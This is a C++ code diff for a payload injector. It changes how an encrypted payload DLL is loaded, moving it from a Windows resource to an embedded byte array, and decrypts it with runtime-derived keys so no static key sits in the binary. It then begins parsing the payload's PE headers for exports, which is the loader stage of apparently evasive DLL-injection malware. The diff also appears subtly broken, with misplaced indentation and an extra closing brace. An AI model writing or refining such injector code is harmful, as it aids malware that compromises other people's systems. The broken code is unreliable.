@@ -4,6 +4,7 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
+#include "../payload/embedded_payload.h"
 #include <iostream>
 #include <sstream>
 
@@ -74,24 +75,19 @@ namespace Injector {
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
-        HMODULE hModule = GetModuleHandle(NULL);
-        HRSRC hRes = FindResourceW(hModule, L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
-        if (!hRes) throw std::runtime_error("Payload resource not found");
-
-        HGLOBAL hData = LoadResource(hModule, hRes);
-        if (!hData) throw std::runtime_error("LoadResource failed");
-
-        void* pData = LockResource(hData);
-        DWORD size = SizeofResource(hModule, hRes);
-        if (!pData || size == 0) throw std::runtime_error("Invalid resource");
-
-        m_payload.assign((uint8_t*)pData, (uint8_t*)pData + size);
-        
-        // Use runtime-derived keys (no static keys in binary)
-        if (!Crypto::DecryptPayload(m_payload)) {
-            throw std::runtime_error("Failed to derive decryption keys");
-        }
+    // Check if embedded payload exists
+    if (!g_encryptedPayload || g_encryptedPayloadSize == 0) {
+        throw std::runtime_error("Embedded payload not available. Rebuild with embedded support.");
     }
+    
+    // Copy the embedded payload
+    m_payload.assign(g_encryptedPayload, g_encryptedPayload + g_encryptedPayloadSize);
+    
+    // Decrypt
+    if (!Crypto::DecryptPayload(m_payload)) {
+        throw std::runtime_error("Failed to decrypt payload");
+    }
+}
 
     DWORD PayloadInjector::GetExportOffset(const char* exportName) {
         auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_payload.data());
